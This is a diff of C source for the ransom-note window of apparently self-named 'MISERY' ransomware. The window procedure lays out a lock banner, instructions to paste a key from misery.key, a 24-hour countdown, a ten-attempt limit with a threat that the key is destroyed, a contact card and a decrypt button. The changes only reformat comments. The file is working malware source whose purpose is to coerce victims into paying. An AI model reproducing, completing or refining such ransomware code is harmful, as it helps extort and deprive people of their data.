@@ -4,26 +4,24 @@
 #include "gui_decrypt.h"
 #include "gui_utils.h"
 
-/* ====================================================================
+/* 
  * RansomWndProc — main window procedure for the ransom note GUI
- * ==================================================================== */
+ */
 LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
 
-    /* ================================================================
-     * WM_CREATE — lay out all child controls
-     * ================================================================ */
+   
     case WM_CREATE: {
         HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE);
 
-        /* ---- BANNER AREA (0,0 – 860,170) ---- */
+        /*   BANNER AREA (0,0 – 860,170)*/
 
         /* Banner background panel */
         CreateWindowExW(0, L"STATIC", L"BANNER_BG",
             WS_CHILD | WS_VISIBLE,
             0, 0, 860, 170, hWnd, (HMENU)IDC_BANNER_BG, hInst, NULL);
 
-        /* Lock icon emoji */
+        // This is for Lock icon imoji
         CreateWindowExW(0, L"STATIC", L"\U0001F512",
             WS_CHILD | WS_VISIBLE,
             30, 20, 60, 50, hWnd, NULL, hInst, NULL);
@@ -52,15 +50,15 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
 
         /* ---- INSTRUCTIONS EDIT ---- */
         const WCHAR *instructions =
-            L"=========================================================\n"
+            L"\n"
             L"  INSTRUCTIONS TO RECOVER YOUR FILES\n"
-            L"=========================================================\n\n"
+            L"\n\n"
             L"  1. DO NOT modify encrypted files yourself.\n"
             L"  2. DO NOT delete misery.key.\n"
             L"  3. Paste the 64-character KEY (second line of misery.key)\n"
             L"     into the box below and click DECRYPT FILES (or press Enter).\n"
             L"  4. You have 24 hours and 10 attempts.\n\n"
-            L"  WARNING: Wrong key attempts are limited.\n"
+            L"  WARNING Wrong key attempts are limited.\n"
             L"           After 10 failures the key is destroyed.";
 
         CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", instructions,
@@ -68,7 +66,7 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
             ES_AUTOVSCROLL | ES_LEFT,
             30, 185, 800, 160, hWnd, NULL, hInst, NULL);
 
-        /* ---- CONTACT CARD (30,360 – 830,445) ---- */
+        /*  CONTACT CARD (30,360 – 830,445)   */
 
         /* Card background */
         CreateWindowExW(0, L"STATIC", L"CARD_BG",
@@ -96,7 +94,7 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
             WS_CHILD | WS_VISIBLE,
             50, 423, 500, 20, hWnd, NULL, hInst, NULL);
 
-        /* ---- DECRYPT SECTION (30,460 – 830,590) ---- */
+        // DECRYPT SECTION (30,460 – 830,590)  
 
         /* Decrypt panel background */
         CreateWindowExW(0, L"STATIC", L"DECRYPT_PANEL",
@@ -114,7 +112,7 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
             WS_CHILD | WS_VISIBLE,
             45, 490, 500, 18, hWnd, NULL, hInst, NULL);
 
-        /* Key edit control — single-line, subclassed for Enter + paste */
+        /* Key edit control */
         {
             HWND hKeyEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                 WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | WS_TABSTOP,
@@ -136,7 +134,7 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
             WS_CHILD | WS_VISIBLE,
             45, 550, 760, 24, hWnd, (HMENU)IDC_STATUS, hInst, NULL);
 
-        /* ---- REFERENCE / FOOTER ---- */
+        /*  REFERENCE / FOOTer*/
         WCHAR refBuf[512];
         wcscpy(refBuf, L"Reference Code:  MISERY-XXXX-XXXX-XXXX\n");
         wcscat(refBuf, L"Key File:        Desktop\\misery.key  OR  %TEMP%\\misery.key\n");
@@ -146,14 +144,14 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
             WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_LEFT,
             30, 605, 800, 50, hWnd, NULL, hInst, NULL);
 
-        /* ---- BOTTOM BAR ---- */
+        /*  BOTTOM BAR   */
 
         /* Attempts counter */
         CreateWindowExW(0, L"STATIC", L"Attempts: 0 / 10",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
             30, 670, 300, 35, hWnd, (HMENU)IDC_ATTEMPTS, hInst, NULL);
 
-        /* CLOSE button — BS_OWNERDRAW */
+        /* CLOSE button W */
         CreateWindowExW(0, L"BUTTON", L"  CLOSE  ",
             WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
             680, 670, 130, 40, hWnd, (HMENU)IDC_CLOSE, hInst, NULL);
@@ -162,9 +160,9 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         return 0;
     }
 
-    /* ================================================================
-     * WM_TIMER — update countdown every second
-     * ================================================================ */
+
+     //WM_TIMER > update countdown every second
+    
     case WM_TIMER: {
         if (wParam == 1) {
             UpdateTimerDisplay(hWnd);
@@ -182,9 +180,8 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         return 0;
     }
 
-    /* ================================================================
-     * WM_CTLCOLORSTATIC — color all STATIC controls
-     * ================================================================ */
+     //WM_CTLCOLORSTATIC 
+   
     case WM_CTLCOLORSTATIC: {
         HDC     hdc   = (HDC)wParam;
         HWND    hCtrl = (HWND)lParam;
@@ -301,9 +298,9 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
     }
 
-    /* ================================================================
-     * WM_CTLCOLOREDIT — color all EDIT controls
-     * ================================================================ */
+
+     //WM_CTLCOLOREDIT — color all EDIT controls
+ 
     case WM_CTLCOLOREDIT: {
         HDC hdc = (HDC)wParam;
         HWND hCtrl = (HWND)lParam;
@@ -341,9 +338,7 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         return (LRESULT)g_hbrBg;
     }
 
-    /* ================================================================
-     * WM_DRAWITEM — custom-drawn buttons (BS_OWNERDRAW)
-     * ================================================================ */
+
     case WM_DRAWITEM: {
         LPDRAWITEMSTRUCT dis = (LPDRAWITEMSTRUCT)lParam;
         HDC hdc = dis->hDC;
@@ -407,9 +402,9 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         return FALSE;
     }
 
-    /* ================================================================
-     * WM_COMMAND — button clicks
-     * ================================================================ */
+ 
+     //WM_COMMAND — button clicks
+     
     case WM_COMMAND:
         if (LOWORD(wParam) == IDC_CLOSE) {
             DestroyWindow(hWnd);
@@ -496,9 +491,9 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         }
         break;
 
-    /* ================================================================
-     * WM_DECRYPT_DONE — posted by DecryptThreadProc
-     * ================================================================ */
+
+     //WM_DECRYPT_DONE — posted by DecryptThreadProc
+
     case WM_DECRYPT_DONE: {
         HWND hStatus = GetDlgItem(hWnd, IDC_STATUS);
         HWND hBtn    = GetDlgItem(hWnd, IDC_DECRYPT_BTN);
@@ -569,9 +564,7 @@ LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam
         return 0;
     }
 
-    /* ================================================================
-     * WM_DESTROY — cleanup timer and quit
-     * ================================================================ */
+    
     case WM_DESTROY:
         KillTimer(hWnd, 1);
         PostQuitMessage(0);
